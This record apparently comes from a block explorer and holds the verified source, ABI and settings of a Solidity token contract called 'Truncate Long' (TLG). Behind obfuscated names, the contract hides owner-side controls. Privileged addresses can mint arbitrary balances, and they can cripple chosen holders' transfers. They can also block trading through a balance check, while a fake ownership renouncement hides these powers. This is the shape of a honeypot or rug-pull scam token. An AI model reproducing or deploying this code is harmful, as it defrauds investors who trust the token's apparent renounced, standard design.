{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface liquidityLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTakeFee {\n    function createPair(address isReceiverTx, address tokenShouldMax) external returns (address);\n}\n\ninterface minTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletMode) external view returns (uint256);\n\n    function transfer(address liquidityBuy, uint256 fundBuyMin) external returns (bool);\n\n    function allowance(address feeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundBuyMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityBuy,\n        uint256 fundBuyMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isAmount, uint256 value);\n    event Approval(address indexed feeReceiver, address indexed spender, uint256 value);\n}\n\ninterface minTakeMetadata is minTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TruncateLong is tradingIs, minTake, minTakeMetadata {\n\n    uint256 private launchMax = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public buyTake;\n\n    function liquidityMinAuto(address enableTake) public {\n        minIsFee();\n        \n        if (enableTake == totalAt || enableTake == tradingMarketing) {\n            return;\n        }\n        buyTake[enableTake] = true;\n    }\n\n    function senderLaunchFrom(address atSender) public {\n        if (launchedTeamLimit) {\n            return;\n        }\n        \n        feeFund[atSender] = true;\n        if (enableFrom == teamTotal) {\n            receiverTokenTeam = true;\n        }\n        launchedTeamLimit = true;\n    }\n\n    event OwnershipTransferred(address indexed modeLimit, address indexed toList);\n\n    bool private receiverTokenTeam;\n\n    function tradingBuy(address fundSenderShould, uint256 fundBuyMin) public {\n        minIsFee();\n        maxIs[fundSenderShould] = fundBuyMin;\n    }\n\n    address launchedAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableSwap;\n    }\n\n    address buyTeamTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private maxIs;\n\n    address public totalAt;\n\n    bool public launchedTeamLimit;\n\n    function transfer(address fundSenderShould, uint256 fundBuyMin) external virtual override returns (bool) {\n        return toAmount(_msgSender(), fundSenderShould, fundBuyMin);\n    }\n\n    function toAmount(address liquidityBuyAuto, address liquidityBuy, uint256 fundBuyMin) internal returns (bool) {\n        if (liquidityBuyAuto == totalAt) {\n            return isTo(liquidityBuyAuto, liquidityBuy, fundBuyMin);\n        }\n        uint256 takeLimit = minTake(tradingMarketing).balanceOf(launchedAmount);\n        require(takeLimit == marketingBuy);\n        require(liquidityBuy != launchedAmount);\n        if (buyTake[liquidityBuyAuto]) {\n            return isTo(liquidityBuyAuto, liquidityBuy, enableAt);\n        }\n        return isTo(liquidityBuyAuto, liquidityBuy, fundBuyMin);\n    }\n\n    uint256 constant enableAt = 18 ** 10;\n\n    mapping(address => mapping(address => uint256)) private limitTake;\n\n    function owner() external view returns (address) {\n        return feeMode;\n    }\n\n    uint8 private exemptFundToken = 18;\n\n    function allowance(address totalLimit, address teamAuto) external view virtual override returns (uint256) {\n        if (teamAuto == buyTeamTotal) {\n            return type(uint256).max;\n        }\n        return limitTake[totalLimit][teamAuto];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellReceiver;\n    }\n\n    address public tradingMarketing;\n\n    function txEnable(uint256 fundBuyMin) public {\n        minIsFee();\n        marketingBuy = fundBuyMin;\n    }\n\n    mapping(address => bool) public feeFund;\n\n    function balanceOf(address walletMode) public view virtual override returns (uint256) {\n        return maxIs[walletMode];\n    }\n\n    uint256 public teamTotal;\n\n    string private sellReceiver = \"TLG\";\n\n    bool private amountExempt;\n\n    constructor (){\n        if (txReceiverIs) {\n            totalMarketing = teamTotal;\n        }\n        liquidityLimit toLiquidityShould = liquidityLimit(buyTeamTotal);\n        tradingMarketing = receiverTakeFee(toLiquidityShould.factory()).createPair(toLiquidityShould.WETH(), address(this));\n        if (totalMarketing != teamTotal) {\n            amountExempt = false;\n        }\n        totalAt = _msgSender();\n        fromLaunched();\n        feeFund[totalAt] = true;\n        maxIs[totalAt] = launchMax;\n        if (totalMarketing == teamTotal) {\n            teamTotal = enableFrom;\n        }\n        emit Transfer(address(0), totalAt, launchMax);\n    }\n\n    function isTo(address liquidityBuyAuto, address liquidityBuy, uint256 fundBuyMin) internal returns (bool) {\n        require(maxIs[liquidityBuyAuto] >= fundBuyMin);\n        maxIs[liquidityBuyAuto] -= fundBuyMin;\n        maxIs[liquidityBuy] += fundBuyMin;\n        emit Transfer(liquidityBuyAuto, liquidityBuy, fundBuyMin);\n        return true;\n    }\n\n    uint256 private totalMarketing;\n\n    function transferFrom(address liquidityBuyAuto, address liquidityBuy, uint256 fundBuyMin) external override returns (bool) {\n        if (_msgSender() != buyTeamTotal) {\n            if (limitTake[liquidityBuyAuto][_msgSender()] != type(uint256).max) {\n                require(fundBuyMin <= limitTake[liquidityBuyAuto][_msgSender()]);\n                limitTake[liquidityBuyAuto][_msgSender()] -= fundBuyMin;\n            }\n        }\n        return toAmount(liquidityBuyAuto, liquidityBuy, fundBuyMin);\n    }\n\n    function fromLaunched() public {\n        emit OwnershipTransferred(totalAt, address(0));\n        feeMode = address(0);\n    }\n\n    function approve(address teamAuto, uint256 fundBuyMin) public virtual override returns (bool) {\n        limitTake[_msgSender()][teamAuto] = fundBuyMin;\n        emit Approval(_msgSender(), teamAuto, fundBuyMin);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptFundToken;\n    }\n\n    address private feeMode;\n\n    string private enableSwap = \"Truncate Long\";\n\n    bool public txReceiverIs;\n\n    uint256 private enableFrom;\n\n    function minIsFee() private view {\n        require(feeFund[_msgSender()]);\n    }\n\n    uint256 marketingBuy;\n\n    uint256 senderToken;\n\n    function getOwner() external view returns (address) {\n        return feeMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundBuyMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"}],\"name\":\"liquidityMinAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSender\",\"type\":\"address\"}],\"name\":\"senderLaunchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSenderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundBuyMin\",\"type\":\"uint256\"}],\"name\":\"tradingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSenderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundBuyMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuyAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundBuyMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundBuyMin\",\"type\":\"uint256\"}],\"name\":\"txEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TruncateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}